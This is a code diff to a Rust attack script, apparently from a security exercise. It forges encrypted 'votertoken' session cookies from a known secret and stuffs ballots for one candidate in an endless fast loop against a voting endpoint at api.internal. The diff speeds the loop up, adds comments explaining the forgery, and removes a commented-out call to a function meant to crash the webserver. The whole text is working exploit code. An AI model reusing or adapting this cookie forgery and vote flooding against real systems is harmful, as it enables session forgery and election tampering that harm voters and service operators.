@@ -17,8 +17,6 @@ pub const KEY_LEN: usize = 32;
 async fn main() {
     let args: Vec<String> = std::env::args().collect();
     let secret = &args[1];
-    // force webserver to restart
-    //crasher();
     //initialize mutable cookie storage
     let jar = reqwest_cookie_store::CookieStore::default();
     let jar = reqwest_cookie_store::CookieStoreMutex::new(jar);
@@ -41,17 +39,19 @@ async fn main() {
     sequence_num += 1;
     println!("Entering endless loop, press ctrl+C to exit.");
     loop{
-        thread::sleep(Duration::from_millis(3000));
-        let bruh2 = client.post("https://api.internal:443/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
+        thread::sleep(Duration::from_millis(100));
+        // send a new vote with our forged cookie
+        let fakevote = client.post("https://api.internal:443/vote").form(&[("candidate","candidate3")]).send().await.unwrap();
         {
             let mut store = jar.lock().unwrap();
-            if bruh2.text().await.unwrap().contains("Thanks for voting"){
+            // check if vote worked
+            if fakevote.text().await.unwrap().contains("Thanks for voting"){
                 println!("Voted for gus with sequence number {}",&sequence_num);
                 store.clear();
                 sequence_num += 1;}
                 let newcookie = Cookie::new("votertoken",encrypt_cookie("votertoken", &sequence_num.to_string(),&secret));
+                // webserver will have removed our cookie regardless of auth success so we need to put it back
                 store.insert_raw(&newcookie, &Url::parse("https://api.internal").unwrap()).unwrap();
-        
         }
     }
 }
